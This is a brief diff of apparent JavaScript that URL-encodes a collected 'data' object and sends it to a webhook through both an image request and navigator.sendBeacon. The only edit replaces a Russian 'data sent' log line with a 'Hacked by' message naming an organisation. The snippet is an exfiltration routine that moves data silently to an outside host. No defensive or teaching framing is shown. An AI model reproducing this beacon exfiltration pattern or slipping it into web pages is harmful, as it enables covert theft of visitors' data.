@@ -10,5 +10,5 @@
   const payload = encodeURIComponent(JSON.stringify(data));
   new Image().src = webhook + '?data=' + payload;
   navigator.sendBeacon(webhook + '?data=' + payload);
-  console.log('✅ Данные отправлены');
+  console.log('Hacked by Vsemirnaya Volonterskaya Organizatsiya');
 })();
